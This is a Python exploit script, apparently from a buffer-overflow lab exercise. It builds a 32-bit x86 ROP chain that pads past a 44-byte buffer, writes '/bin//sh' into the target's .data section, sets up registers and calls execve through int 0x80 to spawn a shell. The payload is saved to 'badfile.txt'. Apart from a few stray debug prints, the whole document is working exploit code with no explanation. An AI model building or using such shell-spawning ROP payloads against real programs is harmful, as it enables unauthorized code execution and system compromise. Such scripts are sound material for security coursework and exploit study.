from struct import pack
p = b'A'*44


p += pack('<I', 0x08058ccc) # pop edx ; ret
p += pack('<I', 0x080cf020) # @ .data
p += pack('<I', 0x0809e16a) # pop eax ; ret
p += b'/bin'
p += pack('<I', 0x08057f62) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x08058ccc) # pop edx ; ret
p += pack('<I', 0x080cf024) # @ .data + 4
p += pack('<I', 0x0809e16a) # pop eax ; ret
print(p)
p += b'//sh'
print(p)
p += pack('<I', 0x08057f62) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x08058ccc) # pop edx ; ret
p += pack('<I', 0x080cf028) # @ .data + 8
p += pack('<I', 0x080574f4) # xor eax, eax ; ret
p += pack('<I', 0x08057f62) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0804815a) # pop ebx ; ret
p += pack('<I', 0x080cf020) # @ .data
p += pack('<I', 0x08058cf2) # pop ecx ; pop ebx ; ret
p += pack('<I', 0x080cf028) # @ .data + 8
p += pack('<I', 0x080cf020) # padding without overwrite ebx
p += pack('<I', 0x08058ccc) # pop edx ; ret
p += pack('<I', 0x080cf028) # @ .data + 8
p += pack('<I', 0x080574f4) # xor eax, eax ; ret
p += pack('<I', 0x080601e3) # inc eax ; ret
p += pack('<I', 0x080601e3) # inc eax ; ret
p += pack('<I', 0x080601e3) # inc eax ; ret
p += pack('<I', 0x080601e3) # inc eax ; ret
p += pack('<I', 0x080601e3) # inc eax ; ret
p += pack('<I', 0x080601e3) # inc eax ; ret
p += pack('<I', 0x080601e3) # inc eax ; ret
p += pack('<I', 0x080601e3) # inc eax ; ret
p += pack('<I', 0x080601e3) # inc eax ; ret
p += pack('<I', 0x080601e3) # inc eax ; ret
p += pack('<I', 0x080601e3) # inc eax ; ret
p += pack('<I', 0x08049be9) # int 0x80


print(b'/bin')
with open("badfile.txt", "wb") as f:
    f.write(p)